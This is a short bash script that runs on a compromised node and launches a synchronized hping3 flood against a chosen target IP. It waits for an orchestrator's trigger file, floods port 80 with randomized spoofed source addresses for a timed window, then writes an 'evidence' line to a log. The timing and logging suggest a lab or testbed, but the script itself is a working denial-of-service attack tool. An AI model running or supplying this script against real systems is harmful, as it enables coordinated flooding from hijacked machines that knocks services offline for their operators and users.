#!/bin/bash
# Hping3 DDoS Attack Script
# Runs ON THE COMPROMISED NODE after SSH compromise
# Synchronized: waits for trigger file /tmp/.hping3_start to be created by orchestrator
#
# Usage: hping3_attack.sh <TARGET_IP> <ATTACK_START> <ATTACK_STOP>
#   TARGET_IP     = target IP to flood
#   ATTACK_START  = T+seconds when attack starts  (default: 60)
#   ATTACK_STOP   = T+seconds when attack stops    (default: 120)
#
# Or via env vars:
#   export TARGET_IP=... ATTACK_START=... ATTACK_STOP=...

TARGET_IP="${1:-${TARGET_IP:-}}"
ATTACK_START="${2:-${ATTACK_START:-60}}"
ATTACK_STOP="${3:-${ATTACK_STOP:-120}}"

if [ -z "$TARGET_IP" ]; then
    echo "[-] ERROR: TARGET_IP is not set (neither as argument nor env var)"
    echo "[-] Usage: $0 <TARGET_IP> [ATTACK_START] [ATTACK_STOP]"
    echo "[-]   or export TARGET_IP=<IP> ATTACK_START=<N> ATTACK_STOP=<N>"
    exit 1
fi

echo "[*] Hping3 Synchronized DDoS - Compromised Node"
echo "[*] Target: $TARGET_IP"
echo "[*] Attack window: T+${ATTACK_START}s to T+${ATTACK_STOP}s"
echo "[*] Waiting for orchestrator trigger signal..."

# Wait for trigger file from orchestrator (sync point)
while [ ! -f /tmp/.hping3_start ]; do
    sleep 0.1
done
echo "[*] Trigger received at T+${ATTACK_START}s: $(date)"

# Launch hping3 flood attack
hping3 --flood --destport 80 --rand-source $TARGET_IP &
HPING_PID=$!
echo "[*] hping3 started with PID: $HPING_PID"

# Wait until stop time
sleep $((ATTACK_STOP - ATTACK_START))
echo "[*] Stop time reached at T+${ATTACK_STOP}s: $(date)"

# Kill hping3
kill $HPING_PID 2>/dev/null
wait $HPING_PID 2>/dev/null
echo "[*] hping3 stopped. Attack complete on $(hostname)."

# Record evidence
echo "Hping3 attack executed on $(hostname) at $(date)" >> /var/log/hping3_attack.log
